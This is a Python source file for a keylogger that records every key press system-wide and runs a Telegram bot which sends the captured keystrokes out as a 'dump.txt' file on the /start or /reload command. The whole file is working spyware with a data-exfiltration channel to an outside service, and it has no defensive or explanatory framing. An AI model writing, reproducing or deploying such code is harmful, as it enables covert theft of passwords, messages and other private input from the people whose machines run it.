import keyboard
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import threading
from io import BytesIO

TOKEN = "telegramToken"

class KeyLogger:
    def __init__(self):
        self.running = True
        self.keystrockes = []
        self.lock = threading.Lock()

    def start(self):
        keyboard.on_press(self.handle_key)
        keyboard.wait()

    def handle_key(self, event):
        key = getattr(event, "name", str(event))

        with self.lock:
            self.keystrockes.append(key)

    def get_keystrockes(self):
        with self.lock:
            return "\n".join(self.keystrockes)

def telegram_bot(keyLogger):

    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Starting... \n/reload -> reload")

        keystrockes_data = keyLogger.get_keystrockes()

        if keystrockes_data:
            file_buffer = BytesIO(keystrockes_data.encode('utf-8'))
            file_buffer.name = "dump.txt"

            await context.bot.send_document(
                chat_id=update.effective_chat.id, 
                document=file_buffer
                )
        else: 
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="No keystrockes recorded.."
            )

    def main() -> None:
        application = Application.builder().token(f"{TOKEN}").build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("reload", start))

        application.run_polling()

    main()

if __name__ == "__main__":
    k = KeyLogger()
    t = threading.Thread(target=k.start)
    t.start()

    telegram_bot(k)
